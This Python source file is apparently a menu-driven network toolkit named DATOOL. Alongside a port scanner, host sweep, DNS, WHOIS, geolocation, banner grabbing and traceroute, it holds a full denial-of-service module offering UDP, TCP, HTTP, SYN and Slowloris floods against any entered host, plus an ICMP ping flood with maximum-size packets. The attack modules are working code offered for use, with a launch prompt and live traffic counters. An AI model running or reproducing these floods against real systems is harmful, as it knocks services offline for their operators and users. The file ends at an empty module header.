#!/usr/bin/env python3

import socket
import threading
import random
import sys
import os
import time
import struct
import subprocess
import json
import ssl
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════════════════════
# COLORS
# ═══════════════════════════════════════════════════════════

class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    ORANGE = "\033[38;5;208m"
    PINK = "\033[38;5;198m"
    GREY = "\033[38;5;240m"

# ═══════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    art = f"""
{C.RED}{C.BOLD}
  ██████╗  █████╗ ████████╗ ██████╗  ██████╗ ██╗     
  ██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  ██║  ██║███████║   ██║   ██║   ██║██║   ██║██║     
  ██║  ██║██╔══██║   ██║   ██║   ██║██║   ██║██║     
  ██████╔╝██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{C.RESET}
{C.GREY}  ──────────────────────────────────────────────────────{C.RESET}
{C.CYAN}  ◈  Network Swiss Army Knife  ◈  v2.0  ◈  by DATOOL  ◈{C.RESET}
{C.GREY}  ──────────────────────────────────────────────────────{C.RESET}
"""
    print(art)

# ═══════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════

def resolve_target(target):
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        print(f"\n  {C.RED}[✗] Could not resolve hostname: {target}{C.RESET}")
        return None

def get_input(prompt, default=None, cast=str):
    try:
        suffix = f" [{C.YELLOW}{default}{C.RESET}]" if default is not None else ""
        val = input(f"  {C.CYAN}◈ {prompt}{suffix}: {C.WHITE}").strip()
        if val == "" and default is not None:
            return cast(default)
        return cast(val)
    except (ValueError, KeyboardInterrupt):
        if default is not None:
            return cast(default)
        return None

def section(title):
    print(f"\n  {C.GREY}{'─'*54}{C.RESET}")
    print(f"  {C.BOLD}{C.MAGENTA}◈ {title}{C.RESET}")
    print(f"  {C.GREY}{'─'*54}{C.RESET}")

def success(msg):
    print(f"  {C.GREEN}[✓]{C.RESET} {msg}")

def info(msg):
    print(f"  {C.BLUE}[i]{C.RESET} {msg}")

def warn(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def error(msg):
    print(f"  {C.RED}[✗]{C.RESET} {msg}")

def progress(msg):
    print(f"  {C.CYAN}[~]{C.RESET} {msg}")

# ═══════════════════════════════════════════════════════════
# MODULE 1: PORT SCANNER
# ═══════════════════════════════════════════════════════════

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
    1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
    5900: "VNC", 5985: "WinRM", 6379: "Redis", 8080: "HTTP-Alt",
    8443: "HTTPS-Alt", 8888: "HTTP-Alt2", 27017: "MongoDB",
    6667: "IRC", 9090: "WebSM", 9200: "Elasticsearch",
    11211: "Memcached", 161: "SNMP", 162: "SNMP-Trap",
}

def grab_banner(ip, port, timeout=2):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        if port in (443, 8443, 993, 995):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=ip)

        if port in (80, 8080, 8443, 443, 8888):
            sock.send(f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
        elif port == 21:
            pass
        elif port == 22:
            pass
        elif port == 25:
            pass
        else:
            sock.send(b"\r\n")

        data = sock.recv(1024).decode(errors="ignore").strip()
        sock.close()
        return data[:120] if data else None
    except Exception:
        return None

def scan_port(ip, port, timeout, grab_banners):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            bn = None
            if grab_banners:
                bn = grab_banner(ip, port)
            service = COMMON_PORTS.get(port, "Unknown")
            return (port, service, bn)
    except Exception:
        pass
    return None

def port_scanner():
    section("PORT SCANNER")

    target = get_input("Target (IP/hostname)")
    ip = resolve_target(target)
    if not ip:
        return

    info(f"Resolved: {target} → {ip}")
    print()

    print(f"  {C.WHITE}Scan Profiles:{C.RESET}")
    print(f"    {C.YELLOW}1{C.RESET}) Quick   — Top 100 common ports")
    print(f"    {C.YELLOW}2{C.RESET}) Full    — All 65535 ports")
    print(f"    {C.YELLOW}3{C.RESET}) Custom  — Specify range or list")
    print()

    profile = get_input("Profile", "1", int)

    if profile == 1:
        ports = sorted(COMMON_PORTS.keys())
    elif profile == 2:
        ports = range(1, 65536)
    elif profile == 3:
        raw = get_input("Ports (e.g. 80,443 or 1-1024)")
        ports = []
        for part in raw.split(","):
            part = part.strip()
            if "-" in part:
                a, b = part.split("-")
                ports.extend(range(int(a), int(b) + 1))
            else:
                ports.append(int(part))
    else:
        ports = sorted(COMMON_PORTS.keys())

    threads = get_input("Threads", "200", int)
    timeout = get_input("Timeout (sec)", "1.0", float)
    grab_banners_yn = get_input("Grab banners? (y/n)", "y")
    grab_banners = grab_banners_yn.lower() == "y"

    total = len(ports) if hasattr(ports, '_len_') else 65535
    info(f"Scanning {total} ports on {ip} with {threads} threads...\n")

    open_ports = []
    scanned = [0]
    start = time.time()

    def scan_worker(port):
        result = scan_port(ip, port, timeout, grab_banners)
        scanned[0] += 1
        if scanned[0] % 500 == 0 or result:
            pct = (scanned[0] / total) * 100
            print(f"\r  {C.GREY}[{pct:5.1f}%] Scanned {scanned[0]}/{total} ports...{C.RESET}", end="", flush=True)
        return result

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_worker, p): p for p in ports}
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)

    elapsed = time.time() - start
    print(f"\r{' ' * 60}\r", end="")

    if open_ports:
        open_ports.sort(key=lambda x: x[0])
        print(f"  {C.GREEN}{'PORT':<10}{'SERVICE':<18}{'BANNER'}{C.RESET}")
        print(f"  {C.GREY}{'─'*54}{C.RESET}")
        for port, service, bn in open_ports:
            banner_str = bn[:60] if bn else ""
            print(f"  {C.WHITE}{port:<10}{C.CYAN}{service:<18}{C.DIM}{banner_str}{C.RESET}")
        print()
        success(f"{len(open_ports)} open ports found in {elapsed:.1f}s")
    else:
        warn("No open ports found.")

    # Export option
    exp = get_input("Export results to file? (y/n)", "n")
    if exp.lower() == "y":
        fname = f"scan_{ip}_{int(time.time())}.txt"
        with open(fname, "w") as f:
            f.write(f"DATOOL Port Scan Report\n")
            f.write(f"Target: {ip} ({target})\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
            for port, service, bn in open_ports:
                f.write(f"Port {port:<8} {service:<18} {bn or ''}\n")
        success(f"Saved to {fname}")

# ═══════════════════════════════════════════════════════════
# MODULE 2: DoS ATTACK
# ═══════════════════════════════════════════════════════════

class DosAttack:
    def _init_(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.connections = 0
        self.errors = 0
        self.stop_flag = False
        self.lock = threading.Lock()

    def inc(self, packets=0, bytes_=0, conns=0, errs=0):
        with self.lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_
            self.connections += conns
            self.errors += errs

    def udp_flood(self, ip, port, payload_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(payload_size)
        while not self.stop_flag:
            try:
                sock.sendto(payload, (ip, port))
                self.inc(packets=1, bytes_=payload_size)
            except Exception:
                self.inc(errs=1)

    def tcp_flood(self, ip, port, payload_size):
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                data = random._urandom(payload_size)
                sock.send(data)
                self.inc(packets=1, bytes_=payload_size, conns=1)
                sock.close()
            except Exception:
                self.inc(errs=1)

    def http_flood(self, ip, port, payload_size):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)",
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0)",
            "curl/7.88.1", "Wget/1.21", "python-requests/2.28.2",
        ]
        paths = ["/", "/index.html", "/api", "/search?q=" + str(random.randint(1,99999)),
                 "/login", "/home", "/about", "/?id=" + str(random.randint(1,99999))]

        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))

                path = random.choice(paths)
                ua = random.choice(user_agents)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,/\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()

                sock.send(request)
                self.inc(packets=1, bytes_=len(request), conns=1)
                sock.close()
            except Exception:
                self.inc(errs=1)

    def syn_flood(self, ip, port, payload_size):
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((ip, port))
                self.inc(packets=1, bytes_=0, conns=1)
                # Don't close — leave half-open
            except Exception:
                self.inc(errs=1)

    def slowloris(self, ip, port, payload_size):
        sockets_list = []
        for _ in range(200):
            if self.stop_flag:
                return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                sockets_list.append(s)
                self.inc(conns=1)
            except Exception:
                self.inc(errs=1)

        while not self.stop_flag:
            for s in list(sockets_list):
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    self.inc(packets=1, bytes_=20)
                except Exception:
                    sockets_list.remove(s)
                    try:
                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ns.settimeout(4)
                        ns.connect((ip, port))
                        ns.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
                        ns.send(f"Host: {ip}\r\n".encode())
                        sockets_list.append(ns)
                        self.inc(conns=1)
                    except Exception:
                        self.inc(errs=1)
            time.sleep(10)

    def mixed_flood(self, ip, port, payload_size):
        """Randomly alternates between UDP, TCP, and HTTP"""
        methods = [self.udp_flood, self.tcp_flood, self.http_flood]
        chosen = random.choice(methods)
        chosen(ip, port, payload_size)

def format_bytes(b):
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if b < 1024:
            return f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} PB"

def dos_attack():
    section("DoS ATTACK")

    target = get_input("Target (IP/hostname)")
    ip = resolve_target(target)
    if not ip:
        return

    info(f"Resolved: {target} → {ip}")
    print()

    port = get_input("Target port", "80", int)

    print()
    print(f"  {C.WHITE}Attack Methods:{C.RESET}")
    print(f"    {C.YELLOW}1{C.RESET}) UDP Flood       — Volumetric, fast, connectionless")
    print(f"    {C.YELLOW}2{C.RESET}) TCP Flood       — Connection-based flood")
    print(f"    {C.YELLOW}3{C.RESET}) HTTP Flood      — Layer 7, randomized requests")
    print(f"    {C.YELLOW}4{C.RESET}) SYN Flood       — Half-open connection exhaustion")
    print(f"    {C.YELLOW}5{C.RESET}) Slowloris       — Slow headers, holds connections")
    print(f"    {C.YELLOW}6{C.RESET}) Mixed           — Random rotation of methods")
    print()

    method = get_input("Method", "1", int)
    threads = get_input("Threads", "100", int)
    duration = get_input("Duration (seconds)", "60", int)
    payload_size = get_input("Payload size (bytes)", "1024", int)

    method_names = {
        1: ("UDP Flood", "udp_flood"),
        2: ("TCP Flood", "tcp_flood"),
        3: ("HTTP Flood", "http_flood"),
        4: ("SYN Flood", "syn_flood"),
        5: ("Slowloris", "slowloris"),
        6: ("Mixed Flood", "mixed_flood"),
    }

    name, func_name = method_names.get(method, ("UDP Flood", "udp_flood"))

    print()
    print(f"  {C.GREY}╔══════════════════════════════════════╗{C.RESET}")
    print(f"  {C.GREY}║{C.RESET}  {C.WHITE}Target   :{C.RESET} {ip}:{port:<18}{C.GREY}║{C.RESET}")
    print(f"  {C.GREY}║{C.RESET}  {C.WHITE}Method   :{C.RESET} {name:<24}{C.GREY}║{C.RESET}")
    print(f"  {C.GREY}║{C.RESET}  {C.WHITE}Threads  :{C.RESET} {threads:<24}{C.GREY}║{C.RESET}")
    print(f"  {C.GREY}║{C.RESET}  {C.WHITE}Duration :{C.RESET} {duration}s{' '*(22-len(str(duration)))}{C.GREY}║{C.RESET}")
    print(f"  {C.GREY}║{C.RESET}  {C.WHITE}Payload  :{C.RESET} {payload_size} bytes{' '*(17-len(str(payload_size)))}{C.GREY}║{C.RESET}")
    print(f"  {C.GREY}╚══════════════════════════════════════╝{C.RESET}")
    print()

    confirm = get_input("Launch attack? (y/n)", "y")
    if confirm.lower() != "y":
        warn("Aborted.")
        return

    atk = DosAttack()
    attack_func = getattr(atk, func_name)

    print(f"\n  {C.RED}{C.BOLD}⚡ ATTACK LAUNCHED ⚡{C.RESET}\n")

    for i in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, payload_size), daemon=True)
        t.start()

    start = time.time()
    try:
        while time.time() - start < duration:
            elapsed = time.time() - start
            remaining = duration - elapsed
            pct = (elapsed / duration) * 100
            bar_len = 30
            filled = int(bar_len * elapsed / duration)
            bar = f"{'█' * filled}{'░' * (bar_len - filled)}"

            pps = atk.packets_sent / max(elapsed, 0.1)
            bps = atk.bytes_sent / max(elapsed, 0.1)

            print(
                f"\r  {C.RED}▸{C.RESET} [{C.YELLOW}{bar}{C.RESET}] {pct:5.1f}% "
                f"{C.GREY}|{C.RESET} {C.WHITE}{atk.packets_sent:>10,}{C.RESET} pkts "
                f"{C.GREY}|{C.RESET} {C.CYAN}{format_bytes(atk.bytes_sent):>10}{C.RESET} "
                f"{C.GREY}|{C.RESET} {C.GREEN}{pps:>8,.0f}{C.RESET} pkt/s "
                f"{C.GREY}|{C.RESET} {C.MAGENTA}{format_bytes(bps)}/s{C.RESET} "
                f"{C.GREY}|{C.RESET} {C.DIM}{int(remaining)}s left{C.RESET}  ",
                end="", flush=True
            )
            time.sleep(0.5)
    except KeyboardInterrupt:
        warn("\nInterrupted by user.")

    atk.stop_flag = True
    time.sleep(1)

    elapsed = time.time() - start
    print(f"\n\n  {C.GREY}{'─'*54}{C.RESET}")
    print(f"  {C.BOLD}{C.GREEN}◈ ATTACK SUMMARY{C.RESET}")
    print(f"  {C.GREY}{'─'*54}{C.RESET}")
    print(f"    {C.WHITE}Total Packets  :{C.RESET} {atk.packets_sent:,}")
    print(f"    {C.WHITE}Total Data     :{C.RESET} {format_bytes(atk.bytes_sent)}")
    print(f"    {C.WHITE}Connections    :{C.RESET} {atk.connections:,}")
    print(f"    {C.WHITE}Errors         :{C.RESET} {atk.errors:,}")
    print(f"    {C.WHITE}Duration       :{C.RESET} {elapsed:.1f}s")
    print(f"    {C.WHITE}Avg Speed      :{C.RESET} {atk.packets_sent/max(elapsed,0.1):,.0f} pkt/s | {format_bytes(atk.bytes_sent/max(elapsed,0.1))}/s")
    print(f"  {C.GREY}{'─'*54}{C.RESET}")

# ═══════════════════════════════════════════════════════════
# MODULE 3: NETWORK SCANNER (ARP-like via ping sweep)
# ═══════════════════════════════════════════════════════════

def ping_host(ip, timeout=1):
    param = "-n" if os.name == "nt" else "-c"
    timeout_flag = "-w" if os.name == "nt" else "-W"
    timeout_val = str(timeout * 1000) if os.name == "nt" else str(timeout)

    try:
        result = subprocess.run(
            ["ping", param, "1", timeout_flag, timeout_val, ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            timeout=timeout + 2
        )
        return result.returncode == 0
    except Exception:
        return False

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"

def quick_port_check(ip, ports, timeout=0.5):
    open_list = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip, p)) == 0:
                open_list.append(p)
            s.close()
        except Exception:
            pass
    return open_list

def detect_os_guess(open_ports):
    if 3389 in open_ports or 445 in open_ports or 135 in open_ports:
        return "Windows"
    elif 22 in open_ports and 80 not in open_ports:
        return "Linux/Unix"
    elif 22 in open_ports and 80 in open_ports:
        return "Linux Server"
    elif 62078 in open_ports:
        return "iOS"
    elif 5353 in open_ports:
        return "macOS"
    elif 80 in open_ports or 443 in open_ports:
        return "Web Server"
    return "Unknown"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def network_scanner():
    section("NETWORK SCANNER")

    local_ip = get_local_ip()
    subnet_prefix = ".".join(local_ip.split(".")[:-1])
    default_range = f"{subnet_prefix}.1-254"

    info(f"Your IP: {local_ip}")
    print()

    scan_range = get_input("IP range (e.g. 192.168.1.1-254)", default_range)
    threads = get_input("Threads", "50", int)
    deep_scan_yn = get_input("Deep scan (check ports per host)? (y/n)", "y")
    deep_scan = deep_scan_yn.lower() == "y"

    # Parse range
    parts = scan_range.rsplit(".", 1)
    base = parts[0]
    if "-" in parts[1]:
        start_end = parts[1].split("-")
        start_host = int(start_end[0])
        end_host = int(start_end[1])
    else:
        start_host = int(parts[1])
        end_host = start_host

    total_hosts = end_host - start_host + 1
    info(f"Scanning {total_hosts} hosts on {base}.x ...\n")

    alive_hosts = []
    scanned_count = [0]
    check_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 3306, 3389, 5900, 8080]

    def scan_host(host_num):
        ip = f"{base}.{host_num}"
        scanned_count[0] += 1
        pct = (scanned_count[0] / total_hosts) * 100
        print(f"\r  {C.GREY}[{pct:5.1f}%] Scanning {ip}...{' '*20}{C.RESET}", end="", flush=True)

        if ping_host(ip, timeout=1):
            hostname = get_hostname(ip)
            open_ports = []
            os_guess = "Unknown"
            if deep_scan:
                open_ports = quick_port_check(ip, check_ports)
                os_guess = detect_os_guess(open_ports)
            return {
                "ip": ip,
                "hostname": hostname,
                "open_ports": open_ports,
                "os": os_guess
            }
        return None

    start = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_host, h): h for h in range(start_host, end_host + 1)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                alive_hosts.append(result)

    elapsed = time.time() - start
    print(f"\r{' '*70}\r", end="")

    alive_hosts.sort(key=lambda x: list(map(int, x["ip"].split("."))))

    if alive_hosts:
        print(f"  {C.GREEN}{'IP':<18}{'HOSTNAME':<28}{'OS':<16}{'OPEN PORTS'}{C.RESET}")
        print(f"  {C.GREY}{'─'*80}{C.RESET}")
        for h in alive_hosts:
            ports_str = ", ".join(str(p) for p in h["open_ports"]) if h["open_ports"] else "-"
            print(
                f"  {C.WHITE}{h['ip']:<18}{C.CYAN}{h['hostname'][:26]:<28}"
                f"{C.YELLOW}{h['os']:<16}{C.DIM}{ports_str}{C.RESET}"
            )
        print()
        success(f"{len(alive_hosts)} hosts alive out of {total_hosts} scanned in {elapsed:.1f}s")
    else:
        warn("No alive hosts found.")

    exp = get_input("Export results? (y/n)", "n")
    if exp.lower() == "y":
        fname = f"network_{base.replace('.','')}{int(time.time())}.txt"
        with open(fname, "w") as f:
            f.write(f"DATOOL Network Scan Report\n")
            f.write(f"Range: {scan_range}\nDate: {datetime.now()}\n{'='*60}\n\n")
            for h in alive_hosts:
                f.write(f"{h['ip']:<18}{h['hostname']:<30}{h['os']:<16}{h['open_ports']}\n")
        success(f"Saved to {fname}")

# ═══════════════════════════════════════════════════════════
# MODULE 4: DNS LOOKUP
# ═══════════════════════════════════════════════════════════

def dns_lookup():
    section("DNS LOOKUP")

    target = get_input("Domain/hostname")
    print()

    # A record
    try:
        ip = socket.gethostbyname(target)
        success(f"A Record        : {ip}")
    except Exception:
        error(f"A Record        : Not found")

    # All IPs
    try:
        results = socket.getaddrinfo(target, None)
        ips = list(set(r[4][0] for r in results))
        for i, addr in enumerate(ips):
            label = "All Addresses   :" if i == 0 else "                 "
            info(f"{label} {addr}")
    except Exception:
        pass

    # Reverse DNS
    try:
        rev = socket.gethostbyaddr(ip)
        info(f"Reverse DNS     : {rev[0]}")
        if rev[1]:
            info(f"Aliases         : {', '.join(rev[1])}")
    except Exception:
        pass

    # MX, NS, TXT via nslookup/dig
    for rtype in ["MX", "NS", "TXT", "CNAME", "SOA"]:
        try:
            if os.name == "nt":
                cmd = ["nslookup", "-type=" + rtype, target]
            else:
                cmd = ["dig", "+short", rtype, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            output = result.stdout.strip()
            if output and "can't find" not in output.lower():
                lines = [l.strip() for l in output.split("\n") if l.strip() and not l.startswith(("Server:", "Address:", ";"))]
                for i, line in enumerate(lines[:5]):
                    label = f"{rtype} Record{' '*(8-len(rtype))}:" if i == 0 else "                 "
                    info(f"{label} {line}")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════
# MODULE 5: IP GEOLOCATION
# ═══════════════════════════════════════════════════════════

def ip_geolocation():
    section("IP GEOLOCATION")

    target = get_input("IP/hostname (leave blank for your IP)", "")

    if target:
        ip = resolve_target(target)
        if not ip:
            return
    else:
        ip = ""

    url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"

    info(f"Querying ip-api.com...")
    print()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        api_ip = socket.gethostbyname("ip-api.com")
        s.connect((api_ip, 80))

        request = (
            f"GET /json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query HTTP/1.1\r\n"
            f"Host: ip-api.com\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.send(request.encode())

        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        s.close()

        body = response.decode().split("\r\n\r\n", 1)[-1]
        data = json.loads(body)

        if data.get("status") == "success":
            fields = [
                ("IP", "query"), ("Country", "country"), ("Country Code", "countryCode"),
                ("Region", "regionName"), ("City", "city"), ("ZIP", "zip"),
                ("Latitude", "lat"), ("Longitude", "lon"), ("Timezone", "timezone"),
                ("ISP", "isp"), ("Organization", "org"), ("AS", "as"),
            ]
            for label, key in fields:
                val = data.get(key, "N/A")
                print(f"  {C.WHITE}{label:<16}:{C.RESET} {C.CYAN}{val}{C.RESET}")
        else:
            error(f"Lookup failed: {data.get('message', 'Unknown error')}")

    except Exception as e:
        error(f"Failed to query API: {e}")

# ═══════════════════════════════════════════════════════════
# MODULE 6: BANNER GRABBER
# ═══════════════════════════════════════════════════════════

def banner_grabber():
    section("BANNER GRABBER")

    target = get_input("Target (IP/hostname)")
    ip = resolve_target(target)
    if not ip:
        return

    raw_ports = get_input("Ports (e.g. 21,22,80,443)", "21,22,25,80,110,143,443,3306,8080")
    ports = [int(p.strip()) for p in raw_ports.split(",")]
    timeout = get_input("Timeout (sec)", "3", float)

    print()
    info(f"Grabbing banners on {ip}...\n")

    print(f"  {C.GREEN}{'PORT':<10}{'STATUS':<12}{'BANNER'}{C.RESET}")
    print(f"  {C.GREY}{'─'*60}{C.RESET}")

    for port in ports:
        bn = grab_banner(ip, port, timeout)
        if bn:
            bn_clean = bn.replace("\r", "").replace("\n", " | ")[:80]
            print(f"  {C.WHITE}{port:<10}{C.GREEN}{'OPEN':<12}{C.DIM}{bn_clean}{C.RESET}")
        else:
            # Check if port is open but no banner
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                if s.connect_ex((ip, port)) == 0:
                    print(f"  {C.WHITE}{port:<10}{C.YELLOW}{'OPEN':<12}{C.DIM}No banner{C.RESET}")
                else:
                    print(f"  {C.WHITE}{port:<10}{C.RED}{'CLOSED':<12}{C.DIM}-{C.RESET}")
                s.close()
            except Exception:
                print(f"  {C.WHITE}{port:<10}{C.RED}{'ERROR':<12}{C.DIM}-{C.RESET}")

# ═══════════════════════════════════════════════════════════
# MODULE 7: PING FLOOD
# ═══════════════════════════════════════════════════════════

def ping_flood():
    section("PING FLOOD (ICMP)")

    target = get_input("Target (IP/hostname)")
    ip = resolve_target(target)
    if not ip:
        return

    count = get_input("Number of pings (0 = infinite)", "0", int)
    size = get_input("Packet size (bytes)", "65500", int)
    interval = get_input("Interval (sec, 0 = fastest)", "0", float)

    print()
    info(f"Pinging {ip} with {size} bytes of data...")
    print()

    param_c = "-n" if os.name == "nt" else "-c"
    param_s = "-l" if os.name == "nt" else "-s"

    sent = 0
    try:
        while True:
            if count > 0 and sent >= count:
                break

            cmd = ["ping", param_c, "1", param_s, str(min(size, 65500)), ip]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)

            sent += 1
            status = f"{C.GREEN}OK{C.RESET}" if result.returncode == 0 else f"{C.RED}FAIL{C.RESET}"

            # Extract time from output
            time_match = re.search(r"time[=<](\d+\.?\d*)", result.stdout)
            rtt = f"{time_match.group(1)}ms" if time_match else "N/A"

            print(f"\r  {C.GREY}[{sent}]{C.RESET} {ip} — {status} — {C.CYAN}{rtt}{C.RESET} — {C.DIM}{size} bytes{C.RESET}  ", end="", flush=True)

            if interval > 0:
                time.sleep(interval)

    except KeyboardInterrupt:
        pass

    print(f"\n\n  {C.GREEN}Sent {sent} pings to {ip}{C.RESET}")

# ═══════════════════════════════════════════════════════════
# MODULE 8: WHOIS LOOKUP (via socket to whois server)
# ═══════════════════════════════════════════════════════════

def whois_lookup():
    section("WHOIS LOOKUP")

    target = get_input("Domain or IP")

    print()
    info(f"Querying WHOIS for {target}...\n")

    try:
        # Determine whois server
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", target):
            whois_server = "whois.arin.net"
        elif target.endswith(".com") or target.endswith(".net"):
            whois_server = "whois.verisign-grs.com"
        elif target.endswith(".org"):
            whois_server = "whois.pir.org"
        elif target.endswith(".io"):
            whois_server = "whois.nic.io"
        elif target.endswith(".co"):
            whois_server = "whois.nic.co"
        else:
            whois_server = "whois.iana.org"

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((whois_server, 43))
        sock.send((target + "\r\n").encode())

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()

        text = response.decode(errors="ignore")

        if text.strip():
            for line in text.strip().split("\n")[:40]:
                line = line.strip()
                if line.startswith("%") or line.startswith("#") or not line:
                    continue
                if ":" in line:
                    key, _, val = line.partition(":")
                    print(f"  {C.WHITE}{key.strip():<30}{C.RESET}: {C.CYAN}{val.strip()}{C.RESET}")
                else:
                    print(f"  {C.DIM}{line}{C.RESET}")
        else:
            warn("No WHOIS data returned.")

    except Exception as e:
        error(f"WHOIS query failed: {e}")

# ═══════════════════════════════════════════════════════════
# MODULE 9: TRACEROUTE
# ═══════════════════════════════════════════════════════════

def traceroute():
    section("TRACEROUTE")

    target = get_input("Target (IP/hostname)")
    ip = resolve_target(target)
    if not ip:
        return

    max_hops = get_input("Max hops", "30", int)

    print()
    info(f"Tracing route to {ip} (max {max_hops} hops)...\n")

    if os.name == "nt":
        cmd = ["tracert", "-d", "-h", str(max_hops), ip]
    else:
        cmd = ["traceroute", "-n", "-m", str(max_hops), ip]

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        hop_num = 0
        for line in process.stdout:
            line = line.strip()
            if not line:
                continue
            # Colorize
            if any(c.isdigit() for c in line[:3]):
                hop_num += 1
                ips = re.findall(r"\d+\.\d+\.\d+\.\d+", line)
                if ips:
                    print(f"  {C.YELLOW}{hop_num:>3}{C.RESET}  {C.CYAN}{ips[0]:<20}{C.RESET} {C.DIM}{line}{C.RESET}")
                elif "*" in line:
                    print(f"  {C.YELLOW}{hop_num:>3}{C.RESET}  {C.RED}{'* * *':<20}{C.RESET} {C.DIM}Request timed out{C.RESET}")
                else:
                    print(f"  {C.DIM}     {line}{C.RESET}")
            else:
                print(f"  {C.DIM}{line}{C.RESET}")
        process.wait()
    except FileNotFoundError:
        error("traceroute/tracert not found on this system.")
    except KeyboardInterrupt:
        warn("Interrupted.")

# ═══════════════════════════════════════════════════════════
# MODULE 10: HEADER GRABBER (HTTP)
# ═══════════════════════════════════════════════════════════

